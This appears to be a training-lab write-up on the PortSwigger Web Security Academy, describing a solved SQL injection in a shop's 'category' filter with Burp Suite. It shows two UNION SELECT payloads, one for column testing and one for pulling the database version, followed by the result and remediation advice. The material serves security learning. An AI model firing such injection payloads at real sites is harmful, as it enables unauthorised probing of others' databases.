# SQL Injection — Querying Database Type and Version

* **Platform:** PortSwigger Web Security Academy
* **Difficulty:** Practitioner
* **Status:** Solved
* **Tool:** Burp Suite
* **Vulnerable parameter:** `category`

## Objective

Retrieve the database version string by exploiting SQL injection in the product category filter.

## Methodology

1. Captured the product category request using Burp Suite.
2. Sent the request to Repeater.
3. Used a `UNION SELECT` payload to test the number and types of columns.
4. Queried the database version using `@@version`.

## Payloads

**Column testing:**

```sql
'+UNION+SELECT+'abc','def'#
```

**Database version retrieval:**

```sql
'+UNION+SELECT+@@version,+NULL#
```

## Results

The injected query was designed to retrieve the database version string.

**Database version returned:** 8.0.42-0ubuntu0.20.04.1

## Impact

SQL injection may expose database software and version information, helping an attacker identify potentially vulnerable software.

## Remediation

* Use parameterized queries (prepared statements).
* Avoid concatenating untrusted input into SQL statements.
* Apply least-privilege permissions to database accounts.

## Evidence

### Lab Completion
<img width="1640" height="272" alt="image" src="https://github.com/user-attachments/assets/7700b67e-af8e-4814-a4c1-f66ae914bbd5" />



### Database Version
<img width="427" height="167" alt="image" src="https://github.com/user-attachments/assets/952f122d-a27a-4989-81f2-4d541184cc4a" />



## Lab Reference

https://0a1400dc03e1bd5482ba15ca002d00e4.web-security-academy.net/
